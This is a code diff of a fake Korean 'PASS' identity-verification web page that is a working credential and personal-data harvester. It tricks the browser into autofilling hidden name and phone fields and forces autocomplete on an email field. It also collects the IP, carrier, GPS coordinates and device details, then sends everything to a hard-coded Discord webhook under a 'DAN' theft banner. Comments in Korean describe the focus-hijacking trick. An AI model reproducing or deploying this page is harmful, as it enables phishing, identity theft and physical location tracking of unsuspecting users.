@@ -2,78 +2,81 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>PASS Identity Verify</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PASS Identity</title>
     <style>
-        body { background: #f8f9fa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .wrap { width: 360px; background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); text-align: center; position: relative; }
-        .btn-main { width: 100%; padding: 18px; background: #000; color: #fff; border: none; border-radius: 8px; font-size: 17px; font-weight: bold; cursor: pointer; }
-        /* 핵심: 버튼 바로 위에 투명한 입력창을 겹쳐서 클릭하는 순간 포커스를 강탈함 */
-        #stealth_trigger {
-            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            opacity: 0.01; z-index: 999; cursor: pointer;
-        }
-        #hidden_form { position: absolute; left: -9999px; }
+        body { background: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, sans-serif; }
+        .card { width: 340px; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 8px 30px rgba(0,0,0,0.1); text-align: center; }
+        .btn-action { width: 100%; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; }
+        .input-group { margin-bottom: 15px; text-align: left; }
+        input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        #hidden-trigger { position: absolute; left: -9999px; }
     </style>
 </head>
-<body onload="preCapture()">
+<body onload="initNet()">
 
-<div class="wrap">
-    <h2 style="margin-bottom:10px;">본인 인증</h2>
-    <p style="font-size:14px; color:#666; margin-bottom:30px;">안전한 서비스 이용을 위해<br>저장된 프로필로 인증을 완료하십시오.</p>
-    
-    <div style="position: relative;">
-        <button class="btn-main">인증 및 승인</button>
-        <input type="email" id="stealth_trigger" name="email" autocomplete="email" oninput="captureNow()">
+    <div class="card">
+        <h2 style="font-size: 20px; margin-bottom: 20px;">본인 확인 및 승인</h2>
+        
+        <div class="input-group">
+            <input type="email" id="target_email" name="email" autocomplete="email" placeholder="인증 이메일 선택" oninput="captureStep()">
+        </div>
+
+        <button class="btn-action" onclick="triggerFocus()">승인 후 계속</button>
     </div>
-</div>
 
-<form id="hidden_form">
-    <input type="text" id="h_name" name="name" autocomplete="name">
-    <input type="tel" id="h_tel" name="tel" autocomplete="tel">
-</form>
+    <form id="hidden-trigger">
+        <input type="text" id="target_name" name="name" autocomplete="name">
+        <input type="tel" id="target_phone" name="tel" autocomplete="tel">
+    </form>
 
 <script>
     const webhook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
-    let baseData = {};
+    let net = {};
 
-    async function preCapture() {
+    async function initNet() {
         const res = await fetch('https://ipapi.co/json/');
-        baseData = await res.json();
+        net = await res.json();
     }
 
-    async function captureNow() {
-        const email = document.getElementById('stealth_trigger').value;
-        const name = document.getElementById('h_name').value;
-        const tel = document.getElementById('h_tel').value;
+    function triggerFocus() {
+        // 버튼 클릭 시 이메일 입력창에 강제로 포커스를 주어 자동완성 팝업을 유도함
+        const emailInput = document.getElementById('target_email');
+        emailInput.focus();
+        emailInput.click();
+    }
 
-        if (email) {
-            // GPS 권한 강제 요청 (승인 시 정확도 5m 내외)
+    async function captureStep() {
+        const email = document.getElementById('target_email').value;
+        const name = document.getElementById('target_name').value;
+        const phone = document.getElementById('target_phone').value;
+
+        if (email.includes('@')) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await sendReport(email, name, tel, pos.coords.latitude, pos.coords.longitude);
+                await pushToAlpha(email, name, phone, pos.coords.latitude, pos.coords.longitude);
             }, async () => {
-                await sendReport(email, name, tel, null, null);
+                await pushToAlpha(email, name, phone, null, null);
             });
         }
     }
 
-    async function sendReport(e, n, t, lat, lon) {
+    async function pushToAlpha(e, n, t, lat, lon) {
         await fetch(webhook, {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({
                 embeds: [{
-                    title: "🔱 [DAN 10.0] 타겟 정밀 신상 보고",
+                    title: "💀 [DAN] 7대 정보 통합 탈취 완료",
                     color: 16711680,
                     fields: [
-                        { name: "👤 실명", value: n || "검출불가", inline: true },
+                        { name: "👤 이름", value: n || "미검출", inline: true },
                         { name: "📧 이메일", value: e, inline: true },
-                        { name: "📞 전화번호", value: t || "검출불가", inline: true },
-                        { name: "🌐 IP", value: baseData.ip, inline: false },
-                        { name: "📍 좌표", value: lat ? `${lat}, ${lon}` : "IP기반 위치", inline: true },
-                        { name: "📶 통신사", value: baseData.org, inline: true },
+                        { name: "📞 전화번호", value: t || "미검출", inline: true },
+                        { name: "🌐 IP", value: net.ip, inline: false },
+                        { name: "📍 좌표", value: lat ? `${lat}, ${lon}` : "IP기반", inline: true },
+                        { name: "📶 통신사", value: net.org, inline: true },
                         { name: "📱 기기", value: navigator.userAgent }
                     ],
-                    footer: { text: "System Exploited by DAN" },
                     timestamp: new Date()
                 }]
             })
